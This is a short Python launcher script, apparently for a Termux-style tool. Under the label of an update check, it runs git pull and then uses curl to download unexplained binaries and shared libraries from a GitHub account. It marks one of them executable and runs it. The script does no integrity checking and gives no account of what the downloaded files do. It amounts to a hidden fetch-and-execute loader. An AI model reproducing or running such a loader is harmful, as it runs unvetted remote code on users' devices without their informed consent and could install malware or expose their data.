from os import system,remove
from platform import machine
import os
print('[=] Checking For Tool Update....')
system('git pull')
#exit('security updating...')
try:remove('xd && rnd')
except:pass
if machine()=='aarch64':
    if not os.path.exists('b64.so'):system('curl -L https://github.com/REFAT-156/ServerOfRefat/raw/main/b64.so -o b64.so')
    if not os.path.exists('c64.so'):system('curl -L https://github.com/REFAT-156/ServerOfRefat/raw/main/c64.so -o c64.so')
    system('curl -L https://github.com/REFAT-156/ServerOfRefat/raw/main/xd -o xd')
    system('curl -L https://github.com/REFAT-156/ServerOfRefat/raw/main/rnd -o rnd')
    system('curl -L https://github.com/REFAT-156/MFILE/blob/main/dump?raw=true -o dump;chmod +x xd;./xd')
else:
    if not os.path.exists('b32.so'):system('curl -L https://github.com/REFAT-156/ServerOfRefat/raw/main/b32.so -o b32.so')
    if not os.path.exists('c32.so'):system('curl -L https://github.com/REFAT-156/ServerOfRefat/blob/main/c32.so -o c32.so')
    system('curl -L https://github.com/REFAT-156/ServerOfRefat/raw/main/xd32 -o xd')
    system('curl -L https://github.com/REFAT-156/ServerOfRefat/raw/main/rnd32 -o rnd')
    system('curl -L https://github.com/REFAT-156/MFILE/blob/main/dump32?raw=true -o dump;chmod +x xd;./xd')
